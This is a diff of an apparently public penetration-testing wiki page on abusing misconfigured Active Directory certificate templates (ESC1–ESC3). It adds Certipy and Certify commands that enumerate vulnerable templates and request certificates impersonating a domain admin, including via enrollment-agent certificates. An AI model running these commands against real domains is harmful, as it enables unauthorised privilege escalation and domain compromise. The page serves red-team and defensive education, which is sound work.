@@ -16,17 +16,17 @@ In [their research papers](https://posts.specterops.io/certified-pre-owned-d9591
 
 ## Practice
 
+### Certificate template allows SAN (ESC1 & ESC2)
+
+When a certificate template allows to specify a `subjectAltName`, it is possible to request a certificate for another user. It can be used for privileges escalation if the EKU specifies `Client Authentication` or `ANY`.
+
 {% tabs %}
 {% tab title="UNIX-like" %}
-From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios. At the time of writing (October 20th, 2021), ESC3 doesn't seem to be fully supported.
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC1 and ESC2 scenarios. It is possible to output the result in an archive that can be uploaded in Bloodhound.
 
 ```python
-certipy 'domain.local'/'user':'password'@'domaincontroller' find -vulnerable
+certipy find 'domain.local'/'user':'password'@'domaincontroller' -bloodhound
 ```
-
-{% hint style="info" %}
-By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
-{% endhint %}
 
 {% hint style="info" %}
 Certipy's auto mode can also be used to automatically find and abuse misconfigured certificate temp
@@ -34,11 +34,15 @@ Certipy's auto mode can also be used to automatically find and abuse misconfigur
 
 Once a vulnerable template is found, a request shall be made to obtain a certificate.
 
-```bash
-certipy 'domain.local'/'user':'password'@'ca_server' req -ca 'ca_name' -template 'vulnerable template' -alt 'domain admin'
+```python
+certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'vulnerable template' -alt 'domain admin'
 ```
 
 The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.
+
+{% hint style="info" %}
+By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
+{% endhint %}
 {% endtab %}
 
 {% tab title="Windows" %}
@@ -62,6 +66,62 @@ The certificate can then be used with [Pass-the-Certificate](../kerberos/pass-th
 {% endtab %}
 {% endtabs %}
 
+### Misconfigured Enrollment Agent Templates (ESC3)
+
+When a certificate template specifies the **Certificate Request Agent** EKU, it is possible to use the issued certificate from this template to request another certificate on behalf of any user.
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate for, and conduct, the ESC3 scenario. It is possible to output the result in an archive that can be uploaded in Bloodhound.
+
+```python
+certipy find 'domain.local'/'user':'password'@'domaincontroller' -bloodhound
+```
+
+Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.
+
+```python
+certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'vulnerable template'
+```
+
+Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.
+
+```python
+certipy req 'domain.local'/'user':'password'@'ca_server' -ca 'ca_name' -template 'User' -on-behalf-of 'domain\domain admin' -pfx 'user.pfx'
+```
+
+{% hint style="info" %}
+By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
+{% endhint %}
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used.
+
+```batch
+# Find vulnerable/abusable certificate templates using default low-privileged group
+Certify.exe find /vulnerable
+
+# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
+Certify.exe find /vulnerable /currentuser
+```
+
+Once a vulnerable template is found, a request shall be made to obtain a certificate specifying the **Certificate Request Agent** EKU.
+
+```batch
+Certify.exe request /ca:'domain\ca' /template:"Vulnerable template"
+```
+
+Then, the issued certificate can be used to request another certificate permitting `Client Authentication` on behalf of another user.
+
+```batch
+Certify.exe request /ca:'domain\ca' /template:"User" /onbehalfon:DOMAIN\Admin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
+```
+{% endtab %}
+{% endtabs %}
+
 ## Resources
 
 {% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}
+
+{% embed url="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" %}
